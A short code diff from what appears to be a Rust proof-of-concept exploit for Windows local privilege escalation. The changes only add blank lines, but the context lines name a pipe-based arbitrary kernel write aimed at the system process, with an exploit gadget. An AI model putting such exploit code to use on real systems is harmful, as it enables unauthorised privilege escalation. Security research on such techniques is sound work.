@@ -332,6 +332,7 @@ fn check_access_token(pt: &mut ProcessTable) {
 
         break buffer;
     };
+    
 
     let info = unsafe {
         &*(buffer.as_ptr() as *const SystemHandleInformation)
@@ -1127,6 +1128,7 @@ pub fn run_poc() {
                 
                 pipe_arbitrary_write_values(&mut h_read_pipe, pt.system_eprocess);
                 println!("start write");
+                
                 pipe_arbitrary_write(
                     &mut h_read_pipe, &log_paths, &exploit_gadget, &mut state, &pt
                 );
